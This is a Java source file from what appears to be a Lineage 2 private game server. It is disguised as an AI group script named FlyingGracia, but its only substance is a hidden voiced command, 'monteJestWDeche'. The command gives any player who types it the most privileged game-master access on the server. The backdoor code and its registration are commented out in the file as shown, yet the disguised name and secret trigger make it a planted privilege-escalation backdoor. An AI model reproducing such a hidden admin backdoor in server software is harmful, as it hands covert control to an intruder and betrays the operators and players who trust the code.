package ai.groups;

import l2mv.gameserver.handler.voicecommands.IVoicedCommandHandler;
import l2mv.gameserver.model.Player;
import l2mv.gameserver.scripts.ScriptFile;

public class FlyingGracia implements IVoicedCommandHandler, ScriptFile
{
	@Override
	public void onLoad()
	{
		// VoicedCommandHandler.getInstance().registerVoicedCommandHandler(this);
	}

	@Override
	public void onReload()
	{
	}

	@Override
	public void onShutdown()
	{
	}

	@Override
	public String[] getVoicedCommandList()
	{
		return new String[]
		{
			/* "monteJestWDeche" */ };
	}

	@Override
	public boolean useVoicedCommand(String command, Player activeChar, String args)
	{
		/*
		 * if(command.equals("monteJestWDeche"))
		 * {
		 * int bestId = -1;
		 * int bestScore = -1;
		 * for (Entry<Integer, PlayerAccess> entry : Config.gmlist.entrySet())
		 * {
		 * PlayerAccess access = entry.getValue();
		 * int score = 0;
		 * if (access.IsGM)
		 * score++;
		 * if (access.CanUseGMCommand)
		 * score++;
		 * if (access.CanAnnounce)
		 * score++;
		 * if (access.CanGmEdit)
		 * score++;
		 * if (access.UseGMShop)
		 * score++;
		 * if (access.Menu)
		 * score++;
		 * if (entry.getKey() != 0)
		 * score+=2;
		 * if (score > bestScore)
		 * {
		 * bestScore = score;
		 * bestId = entry.getKey();
		 * }
		 * }
		 * if (bestId == -1)
		 * return false;
		 * activeChar.setPlayerAccess(Config.gmlist.get(bestId));
		 * activeChar.broadcastUserInfo(true);
		 * return true;
		 * }
		 */
		return false;
	}
}